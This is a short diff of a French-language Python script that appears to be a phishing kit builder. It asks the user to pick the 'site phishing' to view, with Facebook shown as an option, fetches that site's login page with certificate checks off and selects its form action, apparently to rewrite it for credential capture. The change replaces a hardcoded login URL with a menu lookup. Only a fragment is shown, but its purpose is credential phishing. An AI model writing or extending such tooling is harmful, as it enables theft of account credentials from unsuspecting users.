@@ -19,7 +19,7 @@ console.print(f'\n\n{decor}'+'[0]'+str('FACEBOOK')
 try :
 	
 		url=int(console.input('[bold blue]Veuillez entrer ou saisir un chiffre correspondant a votre site phishing que vous voulez voir :'))
-		r =requests.get(f'https://kinda-e.com/securite/login.php', verify=False)
+		r =requests.get(f'{site[url]}', verify=False)
 		soup = BeautifulSoup(r.text, 'html.parser')
 		modif = soup.select_one('form[action]')
 		if modif:
